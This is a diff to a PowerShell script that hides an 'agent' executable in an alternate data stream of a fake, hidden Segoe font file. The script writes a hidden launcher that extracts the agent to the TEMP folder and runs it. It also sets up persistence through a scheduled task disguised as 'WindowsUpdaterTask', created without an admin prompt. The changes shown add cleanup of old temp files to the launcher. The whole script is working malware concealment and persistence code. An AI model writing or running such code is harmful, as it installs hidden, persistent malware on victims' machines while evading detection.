@@ -16,7 +16,6 @@ if (-not (Test-Path $fontDir)) {
 
 $fontFile = "$fontDir\seguibl.ttf"
 if (-not (Test-Path $fontFile)) {
-    # Use a normal hyphen (not em dash) and simple text
     $fakeFontContent = "TTF fake font file - do not delete"
     Set-Content -Path $fontFile -Value $fakeFontContent -Encoding ASCII -Force
     attrib +h $fontFile
@@ -32,12 +31,17 @@ $agentBytes = [System.IO.File]::ReadAllBytes($agentPath)
 Set-Content -Path $fontFile -Stream $streamName -Value $agentBytes -Encoding Byte
 $hiddenPath = "$fontFile`:$streamName"
 
-# --- 3. Create launcher script in the same folder (using string concatenation) ---
+# --- 3. Create launcher script (run.ps1) with cleanup ---
 $launcherPath = "$fontDir\run.ps1"
 $launcherContent = @"
 `$fontFile = '$fontFile'
 `$streamName = '$streamName'
 `$tempAgent = "`$env:TEMP\agent.exe"
+
+# Delete old temp file if it exists
+if (Test-Path `$tempAgent) { Remove-Item `$tempAgent -Force }
+
+# Extract agent from ADS
 `$bytes = Get-Content -Path `$fontFile -Stream `$streamName -Encoding Byte -Raw -ErrorAction SilentlyContinue
 if (`$bytes) {
     [System.IO.File]::WriteAllBytes(`$tempAgent, `$bytes)
@@ -46,7 +50,7 @@ if (`$bytes) {
 "@
 Set-Content -Path $launcherPath -Value $launcherContent -Encoding ASCII -Force
 attrib +h $launcherPath
-Write-Output "[+] Created launcher: $launcherPath"
+Write-Output "[+] Created launcher with cleanup: $launcherPath"
 
 # --- 4. Create scheduled task via COM (no admin, no password prompt) ---
 $taskName = "WindowsUpdaterTask"
